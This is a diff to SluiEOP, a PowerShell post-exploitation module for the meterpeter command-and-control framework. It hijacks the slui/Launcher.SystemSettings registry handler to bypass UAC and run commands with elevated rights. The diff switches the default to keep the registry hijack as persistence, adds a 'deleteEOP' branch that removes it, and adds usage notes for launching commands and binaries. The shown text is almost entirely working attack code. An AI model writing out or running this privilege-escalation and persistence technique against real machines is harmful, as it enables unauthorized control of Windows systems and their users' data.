@@ -19,11 +19,13 @@
 
 .NOTES
    SluiEOP script was written to be one meterpeter C2 post-exploit module.
+   SluiEOP script supports [ CMD | POWERSHELL | PYTHON ] scripts execution.
+   To run child binaries (.exe) through this module use: cmd /c start bin.exe
+
    This script 'reverts' regedit hacks to the previous state before the EOP.
    Unless '$MakeItPersistence = "True"' its set. In that case the EOP registry
    hacks will NOT be deleted in the end of exec making the '$Command' persistence.
-   To run child binaries (.exe) through this module use: cmd /c start binary.exe
-   SluiEOP script supports [ CMD | POWERSHELL | PYTHON ] scripts execution.
+   [ Remark: .\SluiEOP "deleteEOP" argument can be used to delete persistence ]
 
 .EXAMPLE
    PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
@@ -56,7 +58,7 @@
 
 $Command = $Null
 $EOP_Success = $False
-$MakeItPersistence = "False"
+$MakeItPersistence = "True"
 $param1 = $args[0] # User Inputs [<arguments>]
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$env:WINDIR\System32\cmd.exe"
@@ -68,9 +70,31 @@ If(-not($param1) -or $param1 -eq $null){
    $Command = "$param1"
 }
 
+
 ## Check for Vulnerability existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes" -EA SilentlyContinue
 If($CheckVuln -eq $True){
+
+   ## Delete EOP 'persistence' (manual)
+   If($param1 -eq "deleteEOP"){
+      If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){
+         Write-Host "SluiEOP v1.8 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
+         Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 700
+         Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 700
+      }
+      $CheckHive = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -ErrorAction SilentlyContinue
+      If($CheckHive -eq $True){
+         Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
+         Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
+         Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
+         echo "[ ] Success   => MakeItPersistence reverted." > $env:TMP\sLUIEop.log
+         Get-Content -Path "$env:TMP\sLUIEop.log";Remove-Item -Path "$env:TMP\sLUIEop.log" -Force
+      }Else{
+         echo "[ ] Failed    => None SluiEOP registry keys found." > $env:TMP\sLUIEop.log
+         Get-Content -Path "$env:TMP\sLUIEop.log";Remove-Item -Path "$env:TMP\sLUIEop.log" -Force      
+      }
+      Exit
+   }
 
    ## For those who run SluiEOP outside meterpeter C2
    # meterpeter C2 uploads SluiEOP.ps1 to $env:TMP (default)
